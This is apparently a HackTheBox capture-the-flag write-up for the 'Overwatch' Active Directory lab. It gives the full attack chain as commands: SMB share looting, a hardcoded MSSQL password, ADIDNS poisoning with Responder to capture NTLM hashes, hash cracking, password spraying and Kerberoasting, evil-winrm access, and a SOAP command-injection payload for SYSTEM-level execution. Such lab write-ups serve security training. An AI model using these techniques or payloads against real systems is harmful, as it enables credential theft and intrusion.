# Overwatch - HackTheBox Writeup

**Target:** `TARGET_IP`
**Domain:** `overwatch.htb`
**OS:** Windows Server 2022 (Active Directory)
**Difficulty:** Medium/Hard

---

## Attack Chain Overview

```
SMB Share (software$)
    ↓
Connection String in Binary (strings + grep)
    ↓
sqlsvc MSSQL Credentials (port 6520)
    ↓
Linked Server SQL07 → DNS Poisoning → Responder → NTLM Hash
    ↓
Password Spraying → sqlmgmt Account
    ↓
WinRM Access → User Flag
    ↓
WCF Service Command Injection (port 8000)
    ↓
Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [MSSQL Enumeration](#mssql-enumeration)
4. [Linked Server Exploitation & ADIDNS Poisoning](#linked-server-exploitation--adidns-poisoning)
5. [Password Spraying](#password-spraying)
6. [User Flag - sqlmgmt](#user-flag---sqlmgmt)
7. [Privilege Escalation](#privilege-escalation)
8. [Root Flag](#root-flag)

---

## Reconnaissance

### Host Setup
```bash
# What it does: add the target IP and domain names to the local hosts file.
# Why here: ensure proper resolution for Active Directory domain and hostname lookups.
echo "TARGET_IP overwatch.htb S200401.overwatch.htb S200401" | sudo tee -a /etc/hosts
```

### Nmap Scan
```bash
# What it does: perform an Nmap scan targeting common AD and MSSQL ports.
# Why here: discover the specific ports used by the Windows environment, including the non-standard MSSQL port 6520.
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP
```

**Key Findings:**

| Port   | Service  | Details                                      |
|--------|----------|----------------------------------------------|
| 53     | DNS      | Domain Name Service                            |
| 88     | Kerberos | Active Directory authentication                |
| 389    | LDAP     | Domain controller (overwatch.htb)              |
| 445    | SMB      | Signing enabled and **required**               |
| 3389   | RDP      | Remote Desktop                                 |
| 5985   | WinRM    | Windows Remote Management                      |
| **6520** | **MSSQL** | **Non-standard port, SQL Server 2022 RTM**   |

---

## Initial Access

### SMB Enumeration

```bash
# What it does: perform a broad SMB share enumeration with null and guest accounts.
# Why here: check for unauthenticated access to system shares or public deployment directories.
netexec smb overwatch.htb -u '' -p '' --shares
netexec smb TARGET_IP -u 'guest' -p '' --shares
```
**Result:** `STATUS_ACCESS_DENIED` — Null sessions and guest access blocked.

```bash
# What it does: connect to the software$ share anonymously.
# Why here: search for installer binaries, source code, or configuration files that might contain hardcoded secrets.
smbclient //TARGET_IP/software$ -N
```
**Result:** ✅ Anonymous access to `software$` share granted.

### Credential Discovery

Downloaded binaries and configuration files from the share. The key file was `overwatch.exe.config` containing Entity Framework configuration.

**Extract Unicode strings from the binary and search for credentials:**
```bash
# What it does: extract UTF-16 little-endian strings from the overwatch.exe binary.
# Why here: search for hardcoded connection strings or credentials within the application.
strings -e l overwatch.exe | grep -iE "password|user|sql|connection"
```

**🎯 FOUND — Hardcoded MSSQL connection string:**
```
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
```

### MSSQL Access Verification

```bash
# What it does: validate the captured sqlsvc credentials against the MSSQL instance.
# Why here: confirm the hardcoded password found in the binary is valid for remote database access.
netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
```
```
[+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```
**✅ Valid credentials confirmed.**

---

## MSSQL Enumeration

### Privilege Check

```bash
# What it does: check if the sqlsvc account has sysadmin privileges.
# Why here: determine if the database service account has full server control or if vertical escalation is required.
netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
  -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
```
**Result:** ❌ NOT a sysadmin.

### Interactive Session

```bash
# What it does: establish an interactive session with the MSSQL server.
# Why here: perform internal database enumeration and execute T-SQL commands for linked server discovery.
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
```

```sql
enum_users
enum_owner
```

**Critical Finding:** `OVERWATCH\sqlsvc` is **db_owner** and **OWNER** of the `overwatch` database — but has no server-level privileges.

### Dead-End Vectors

| Vector          | Result            | Blocked Reason                          |
|-----------------|-------------------|-----------------------------------------|
| Impersonation   | Empty             | No IMPERSONATE privilege                  |
| TRUSTWORTHY     | 0 (OFF)           | CLR Assembly escalation not possible    |
| xp_cmdshell     | Permission denied | No ALTER SETTINGS / sysadmin              |
| RECONFIGURE     | Permission denied | Not sysadmin                              |

### Active Directory Enumeration

**SYSVOL Access:**
```bash
# What it does: recursively download the contents of the SYSVOL share using captured credentials.
# Why here: search for Group Policy Preferences (GPP), scripts, or configuration files containing domain secrets.
smbclient //TARGET_IP/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
  -c "recurse ON; prompt OFF; cd overwatch.htb; mget *" 2>/dev/null
```

**LDAP User Enumeration:**
```bash
# What it does: perform LDAP user enumeration using authenticated bind.
# Why here: obtain a complete list of domain users for later password spraying attacks.
netexec ldap TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users 2>/dev/null
```

**AS-REP Roasting:**
```bash
# What it does: perform an AS-REP Roasting attack against the domain.
# Why here: check for accounts with 'Do not require Kerberos preauthentication' set to crack their hashes offline.
impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
```
**Result:** No AS-REP roastable accounts found.

---

## MSSQL Recon Cheat Sheet

### Phase 1 — Basic MSSQL Recon
```sql
SELECT @@version;                          -- Identify MSSQL version, OS version, and patch level
SELECT @@servername;                        -- Get hostname of the SQL server
SELECT SYSTEM_USER;                         -- Confirm current login (OVERWATCH\sqlsvc)
SELECT USER_NAME();                         -- Shows database-level user identity
SELECT HOST_NAME();                         -- Shows client machine connected to MSSQL
SELECT DB_NAME();                           -- Displays current database in use
SELECT IS_SRVROLEMEMBER('sysadmin');       -- Checks for sysadmin privileges
SELECT IS_SRVROLEMEMBER('public');         -- Confirms default role membership
```

### Phase 2 — Permission & Role Enumeration
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');                          -- Lists all server-level permissions
SELECT name, type_desc FROM sys.server_principals;                        -- Lists all SQL and Windows logins
SELECT * FROM sys.server_permissions;                                     -- Shows permissions for users/roles
SELECT name, password_hash FROM sys.sql_logins;                           -- Extracts SQL login hashes
SELECT * FROM sys.database_principals;                                    -- Lists database-level users
SELECT * FROM sys.database_permissions;                                   -- Shows database permissions
```

### Phase 3 — Database Enumeration
```sql
SELECT name FROM sys.databases;                                           -- Lists all databases (master, msdb, overwatch)
USE overwatch;                                                            -- Switch to application database
SELECT name FROM sys.tables;                                              -- Lists all tables in overwatch database
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;                         -- Alternative table enumeration
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;           -- Lists all columns in all tables
SELECT TOP 50 * FROM <tablename>;                                         -- Dumps first 50 rows from target table
```

### Phase 4 — System Database Enumeration
```sql
SELECT name FROM msdb.sys.tables;                                         -- Lists tables in msdb (jobs, backups, credentials)
SELECT * FROM msdb.dbo.sysjobs;                                           -- Lists scheduled SQL jobs
SELECT * FROM msdb.dbo.backupset;                                         -- Shows backup history and file paths
SELECT * FROM master.sys.databases;                                       -- Lists system databases with metadata
SELECT * FROM master.sys.syslogins;                                       -- Shows system logins
```

### Phase 5 — Linked Server Discovery
```sql
EXEC sp_linkedservers;                                                    -- Lists all linked SQL servers
SELECT * FROM sys.servers;                                                -- Shows linked server configuration (RPC, data access)
EXEC sp_helpserver;                                                       -- Displays server and linked server information
EXEC sp_helplinkedsrvlogin;                                               -- Shows linked server login mappings
SELECT * FROM sys.linked_logins;                                          -- Displays linked server credential mapping
```

### Phase 6 — Linked Server Testing
```sql
EXEC ('SELECT @@version') AT SQL07;                                       -- Test connection to linked server SQL07
SELECT * FROM OPENQUERY(SQL07,'SELECT @@version');                        -- Alternative query to linked server
EXEC ('SELECT SYSTEM_USER') AT SQL07;                                     -- Check authentication on linked server
EXEC ('SELECT name FROM master.sys.databases') AT SQL07;                  -- Enumerate remote databases
```

### Phase 7 — Command Execution Checks
```sql
EXEC xp_cmdshell 'whoami';                                                -- Test OS command execution
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;                -- Enable advanced SQL options
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;                          -- Enable xp_cmdshell
EXEC xp_cmdshell 'ipconfig';                                              -- Check network configuration
EXEC xp_cmdshell 'hostname';                                              -- Get system hostname
```

### Phase 8 — SQL Server Services & Configuration
```sql
EXEC sp_configure;                                                        -- Lists SQL server configuration settings
SELECT servicename, service_account FROM sys.dm_server_services;          -- Shows SQL service account
SELECT * FROM sys.dm_exec_connections;                                    -- Lists active connections
SELECT * FROM sys.dm_exec_sessions;                                       -- Shows current sessions
```

### Phase 9 — Domain & Network Information
```sql
SELECT name FROM sys.server_principals WHERE type_desc='WINDOWS_LOGIN';  -- Lists AD users connected to SQL
SELECT * FROM sys.remote_logins;                                          -- Shows remote authentication settings
SELECT * FROM sys.credentials;                                            -- Lists stored credentials
SELECT * FROM sys.endpoints;                                              -- Shows SQL network endpoints
```

---

## Linked Server Exploitation & ADIDNS Poisoning

### Step 1 — Discover Linked Servers

```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked = 1;
```

**Result:** A linked server named `SQL07` was discovered.

> **What is a linked server** It allows a SQL Server instance to access and execute commands against another database server remotely. It acts as a virtual bridge, enabling distributed queries across systems without needing ETL processes or manual data copying.

### Step 2 — Check Login Mappings

```sql
EXEC sp_helplinkedsrvlogin;
```

**Result:** No rows returned — **no explicit login mappings** configured.

| Mapping Type      | Behavior                                                              |
|-------------------|-----------------------------------------------------------------------|
| **Explicit**      | Local login manually mapped to a specific remote username + password |
| **Self Mapping**  | SQL Server uses the current connection's security context             |

Since no explicit mappings exist, the linked server uses **self-mapping**. Any query to `SQL07` will authenticate as `OVERWATCH\sqlsvc`.

### Step 3 — Test Linked Server Connection

```sql
EXEC ('SELECT @@version') AT SQL07;
```

**Result:** ❌ `"Server is not found or not accessible"` with login timeout.

**Key Insight:** SQL Server is trying to **resolve `SQL07` via DNS** but no record exists. The failure happens at the DNS resolution stage — not at authentication. This means if we can poison DNS for `SQL07`, we control where the authentication attempt goes.

### Step 4 — ADIDNS Poisoning Attack

Since `sqlsvc` is a service account with **DNS modification rights** in Active Directory, we can create a fake A record.

**Attack Flow:**
```
sqlsvc creates DNS record: SQL07.overwatch.htb → [Attacker IP]
    ↓
SQL Server queries linked server SQL07
    ↓
DNS resolves to Attacker IP
    ↓
SQL Server sends NTLM authentication to Attacker
    ↓
Responder captures NTLMv2 hash
    ↓
Crack hash → new credentials
```

```bash
# Create fake A record for SQL07 pointing to attacker machine
dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  --action add --record SQL07 --data <ATTACKER_IP> TARGET_IP

# Start Responder to capture NTLM authentication
# What it does: start Responder to capture NTLM authentication.
# Why here: catch the NTLMv2 hash when the SQL Server attempts to authenticate to our poisoned DNS record.
sudo responder -I tun0
```

### Step 5 — Capture the Hash

Re-trigger the linked server query to force the authentication attempt:

```sql
EXEC ('SELECT @@version') AT SQL07;
```

**Responder output:** NTLMv2 hash captured from the SQL Server service attempting to authenticate to our machine.

### Step 6 — Crack the Hash

```bash
# What it does: crack the captured NTLMv2 hash using rockyou.txt.
# Why here: recover the cleartext password for the sqlmgmt account.
hashcat -m 5600 <captured_hash> /usr/share/wordlists/rockyou.txt --force
```

**Result:** Hash cracked → revealed credentials for the `sqlmgmt` account.

---

## Password Spraying

### Password Policy Check
```bash
# What it does: retrieve the domain password policy via SMB.
# Why here: identify lockout thresholds and complexity requirements to inform a safe password spraying strategy.
netexec smb TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --pass-pol
```

### SMB Spraying (Fast)
```bash
# What it does: perform a password spraying attack using the sqlsvc password.
# Why here: check for other domain accounts that reuse the same hardcoded password found earlier.
netexec smb TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
```

### LDAP Spraying (Stealth)
```bash
# What it does: validate credentials against LDAP during the password spray.
# Why here: confirm domain account validity and potentially discover accounts with broader LDAP search privileges.
netexec ldap TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
```

### Kerbrute Spraying
```bash
kerbrute passwordspray -d overwatch.htb --dc TARGET_IP users.txt 'TI0LKcfHzZw1Vv'
```

### Kerberoasting
```bash
# What it does: request Service Principal Name (SPN) tickets for domain user accounts.
# Why here: perform a Kerberoasting attack to capture TGS tickets for offline cracking of service account passwords.
impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
```

---

## User Flag - sqlmgmt

The cracked hash revealed credentials for `sqlmgmt`, a member of the **Remote Management Users** group — granting WinRM access to the domain controller.

### Connect via WinRM
```bash
# What it does: connect to the target via WinRM as sqlmgmt.
# Why here: establish the first interactive session on the DC using the cracked credentials.
evil-winrm -i TARGET_IP -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
```

### Capture User Flag
```powershell
# What it does: executes a Windows command line action.
# Why here: enumerate, transfer, replace or validate artifacts on the victim.
type C:\Users\sqlmgmt\Desktop\user.txt
```

---

## Privilege Escalation

### NSSM Service Discovery

Standard `Get-Service` was restricted. Enumerated services directly through the registry instead.

```powershell
Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services" |
    Where-Object { $_.PSChildName -like "*nssm*" } |
    Select-Object PSChildName
```

**Found:** `nssm-2.24` (Non-Sucking Service Manager) — a service wrapper that runs executables as Windows services.

### Locate NSSM-Managed Services

```powershell
Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services" |
    ForEach-Object {
        $imagePath = (Get-ItemProperty -Path $_.PSPath -Name "ImagePath" -ErrorAction SilentlyContinue).ImagePath
        if ($imagePath -like "*nssm*") {
            Write-Host "Service: $($_.PSChildName)" -ForegroundColor Yellow
            Write-Host "ImagePath: $imagePath" -ForegroundColor White
            Write-Host ""
        }
    }
```

**Result:** Custom service **`overwatch`** found:
```
Service: overwatch
ImagePath: C:\Program Files\nssm-2.24\win64\nssm.exe
```

### Service Configuration Analysis

```powershell
# Get service parameters
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch\Parameters" | Format-List *

# Get full service configuration
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch" | Format-List *

# Check the service account (what user does it run as)
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch" -Name "ObjectName").ObjectName
```

### WCF Service Discovery

Found a WCF (Windows Communication Foundation) service listening on port 8000:

```powershell
netstat -ano | findstr ":8000"
Get-Process -Id (Get-NetTCPConnection -LocalPort 8000 -ErrorAction SilentlyContinue).OwningProcess
```

Explored the service directory:
```powershell
# What it does: navigate to the WCF service directory.
# Why here: inspect the application binaries and configuration for command injection vulnerabilities.
cd C:\Software\Monitoring\
Get-ChildItem -Force | Format-Table Name, Length, LastWriteTime -AutoSize
Get-ChildItem -Force -Recurse | Select-Object FullName, Length, LastWriteTime
```

### Vulnerability: Unvalidated ProcessName Parameter

The `overwatch` monitoring service exposes a `KillProcess` SOAP endpoint that accepts a `processName` parameter. This parameter is **not sanitized** — it gets passed directly to a shell command, enabling **command injection**.

### Proof of Concept — Kill notepad via SOAP

**1. Start notepad as test target:**
```powershell
Start-Process notepad -WindowStyle Hidden
Get-Process -Name "notepad" -ErrorAction SilentlyContinue
```

**2. Send SOAP request to kill it:**
```powershell
$killSoap = @"
<xml version="1.0" encoding="utf-8">
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <KillProcess xmlns="http://tempuri.org/">
            <processName>notepad</processName>
        </KillProcess>
    </soap:Body>
</soap:Envelope>
"@

$headers = @{
    "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess"
}

$response = Invoke-RestMethod -Uri "http://localhost:8000/MonitorService" `
    -Method Post `
    -ContentType "text/xml; charset=utf-8" `
    -Body $killSoap `
    -Headers $headers

Write-Host "[+] KillProcess executed!" -ForegroundColor Green
```

**3. Verify notepad was killed:**
```powershell
Start-Sleep -Seconds 2
Get-Process -Name "notepad" -ErrorAction SilentlyContinue
```

**Result:** ✅ Notepad killed successfully — the WCF service executed the command with its privileged context.

---

## Root Flag

### Command Injection via SOAP

The `processName` parameter is passed directly to the shell without sanitization. By injecting a semicolon, we can chain arbitrary commands.

**Payload:**
```xml
<processName>notepad;type C:\Users\Administrator\Desktop\root.txt</processName>
```

This tells the service to: `kill notepad` **AND THEN** `cat the root flag`.

### Exploit with curl

```bash
# What it does: send a malicious SOAP request with an injected command.
# Why here: exploit the unvalidated KillProcess parameter to read the root flag as SYSTEM.
curl.exe -X POST http://127.0.0.1:8000/MonitorService `
  -H "Content-Type: text/xml; charset=utf-8" `
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" `
  -d "<xml version='1.0' encoding='utf-8'>
<soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
  xmlns:xsd='http://www.w3.org/2001/XMLSchema'
  xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
  <soap:Body>
    <KillProcess xmlns='http://tempuri.org/'>
      <processName>notepad;type C:\Users\Administrator\Desktop\root.txt</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>"
```

**Result:** ✅ Root flag returned in the SOAP response.

### Alternative — PowerShell

```powershell
$rootSoap = @"
<xml version="1.0" encoding="utf-8">
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <KillProcess xmlns="http://tempuri.org/">
            <processName>notepad;type C:\Users\Administrator\Desktop\root.txt</processName>
        </KillProcess>
    </soap:Body>
</soap:Envelope>
"@

Invoke-RestMethod -Uri "http://localhost:8000/MonitorService" `
    -Method Post `
    -ContentType "text/xml; charset=utf-8" `
    -Body $rootSoap `
    -Headers @{ "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess" }
```

---

## Summary

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Nmap scan | MSSQL on non-standard port 6520 |
| **Initial Access** | SMB share → binary analysis | Connection string hardcoded in `overwatch.exe` |
| **Enumeration** | MSSQL client | sqlsvc is db_owner, not sysadmin |
| **Pivot** | Linked server + ADIDNS poisoning | Fake DNS record → Responder → NTLM hash |
| **Lateral Movement** | Hash cracking + password spraying | `sqlmgmt:bIhBbzMMnB82yx` |
| **User Flag** | WinRM (evil-winrm) | Remote Management Users group |
| **Privilege Escalation** | WCF service command injection | Unvalidated `processName` parameter → RCE as SYSTEM |
| **Root Flag** | SOAP request with injected command | `;type C:\Users\Administrator\Desktop\root.txt` |


